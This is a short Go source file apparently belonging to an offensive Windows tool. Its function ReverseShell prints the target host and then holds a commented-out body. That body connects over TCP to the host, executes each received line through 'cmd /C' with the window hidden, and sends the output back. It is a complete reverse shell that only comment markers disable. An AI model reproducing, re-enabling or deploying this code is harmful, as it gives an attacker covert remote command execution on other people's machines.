
package util

import (
	// "bufio"
	"fmt"
	// "net"
	// "os/exec"
	// "syscall"
)

func Test(){
	fmt.Println("Windows")
}

func ReverseShell(host string) {
	fmt.Println("Host: " + host)
	// conn, err := net.Dial("tcp", host)
	// if err != nil {
	// 	fmt.Println("Could not connect to server")
	// 	conn.Close()
	// 	return
	// }

	// r := bufio.NewReader(conn)
	// for {
	// 	order, err := r.ReadString('\n')
	// 	if nil != err {
	// 		conn.Close()
	// 		return
	// 	}

	// 	cmd := exec.Command("cmd", "/C", order)
	// 	// +build
	// 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	// 	out, _ := cmd.CombinedOutput()

	// 	conn.Write(out)
	// }

}
